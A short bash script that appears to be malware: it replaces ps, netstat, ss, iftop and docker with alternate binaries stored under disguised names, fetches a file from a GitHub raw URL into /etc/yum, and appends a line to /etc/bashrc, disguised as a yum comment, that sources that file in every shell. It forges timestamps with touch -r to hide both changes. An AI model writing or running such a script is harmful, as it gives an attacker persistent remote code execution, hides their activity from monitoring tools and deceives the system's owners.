#!/bin/bash
#find ps netstat ss iftop
if [  -f "/sbin/iftop2" ];then
        rm -rf /sbin/iftop
        mv /sbin/iftop2 /sbin/iftop
fi
if [  -f "/sbin/ntss" ];then
        rm -rf /sbin/ss
        mv /sbin/ntss /sbin/ss
fi
if [  -f "/bin/ntstat" ];then
        rm -rf /bin/netstat
        mv /bin/ntstat /bin/netstat
fi
if [  -f "/bin/efps" ];then
        rm -rf /bin/ps
        mv /bin/efps /bin/ps
fi
if [  -f "/usr/bin/docker-ce" ];then
        rm -rf /usr/bin/docker
        mv /usr/bin/docker-ce /usr/bin/docker
fi
wget -O /etc/yum/yum-update.rc https://raw.githubusercontent.com/jackmoc/update/main/bash/yum-update.rc
touch -r /bin/bash /etc/yum/yum-update.rc
echo '# See /etc/yum/ in the yum package.
if [ -f /etc/yum/yum-update.rc ]; then
        . /etc/yum/yum-update.rc
fi' >> /etc/bashrc
touch -r /bin/bash /etc/bashrc
